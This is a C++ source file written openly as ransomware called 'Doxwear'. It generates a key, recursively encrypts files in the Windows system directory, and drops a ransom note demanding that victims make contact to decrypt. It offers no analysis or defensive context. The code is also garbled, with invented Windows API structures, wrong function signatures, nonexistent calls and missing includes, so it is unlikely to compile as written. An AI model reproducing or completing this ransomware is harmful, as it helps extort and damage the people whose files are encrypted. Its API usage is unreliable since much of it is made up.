#include <windows.h>
#include <shellapi.h>
#include <string>

#pragma comment(lib, "Crypt32.lib")

std::wstring get_system_directory()
{
    wchar_t buffer[MAX_PATH];
    GetSystemDirectoryW(buffer, MAX_PATH);
    return std::wstring(buffer);
}

std::wstring get_appdata_dir()
{
    wchar_t buffer[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, buffer);
    return std::wstring(buffer) + L"\\Doxwear";
}

void create_cryptkey()
{
    CRYPTPROTECTMEMORY protect;
    protect.cbSize = sizeof(protect);

    // Generate random key
    DWORD key_length = 32; // AES-256
    BYTE *key = new BYTE[key_length];
    CryptGenKey(CRYPTPROTECT_LOCAL_MACHINE, PROV_RSA_FULL, 0, (HCRYPTKEY*)&key);
    memcpy(key, "Doxwear", sizeof("Doxwear"));

    // Protect key with CRYPTPROTECTMEMORY
    protect.dwFlags = CRYPTPROTECT_UI_FORBIDDEN;
    protect.dwLen = key_length;
    protect.pszDataDesc = L"";
    CryptProtectMemory(key, &protect);

    std::wstring appdata_dir = get_appdata_dir();
    CreateDirectoryW(appdata_dir.c_str(), NULL);
    std::ofstream file(appdata_dir + L"\cryptkey.bin");
    file.write(reinterpret_cast<const char*>(key), key_length);
    file.close();

    delete[] key;
}

void encrypt_file(const std::wstring& path, const std::wstring& key)
{
    DWORD buffer_size = GetFileSizeEx(path.c_str(), NULL).QuadPart;
    BYTE *buffer = new BYTE[buffer_size];
    ReadFile(GetFileHandle(path), buffer, buffer_size, &buffer_size, 0);

    // Encrypt file using CRYPTPROTECTMEMORY
    std::wstring appdata_dir = get_appdata_dir();
    CRYPTPROTECTMEMORY protect;
    protect.cbSize = sizeof(protect);
    protect.dwFlags = CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_LOCAL_MACHINE;
    protect.dwLen = buffer_size + 1; // Add one for null terminator
    protect.pszDataDesc = L"";
    protect.pvMemory = buffer;

    CryptProtectMemory((void*)buffer, &protect);

    std::ofstream encrypted_file(appdata_dir + path.substr(path.find_last_of(L"\\")));
    encrypted_file.write(reinterpret_cast<const char*>(buffer), buffer_size);
    encrypted_file.close();

    delete[] buffer;
}

void encrypt_directory(const std::wstring& dir)
{
    for (const auto& entry : fs::directory_iterator(dir))
    {
        if (entry.is_regular_file())
        {
            encrypt_file(entry.path(), L"");
        }
        else
        {
            encrypt_directory(entry.path().wstring());
        }
    }
}

void main()
{
    create_cryptkey();
    encrypt_directory(get_system_directory());

    // Display ransom note
    std::wstring ransom_note = get_appdata_dir() + L"\readme.txt";
    std::ofstream file(ransom_note);
    file << "Your files have been encrypted by Doxwear.\n\n"
         << "To decrypt your files, contact us at doxwear@example.com."
         << "\n\nDoxwear Team";
    file.close();
}
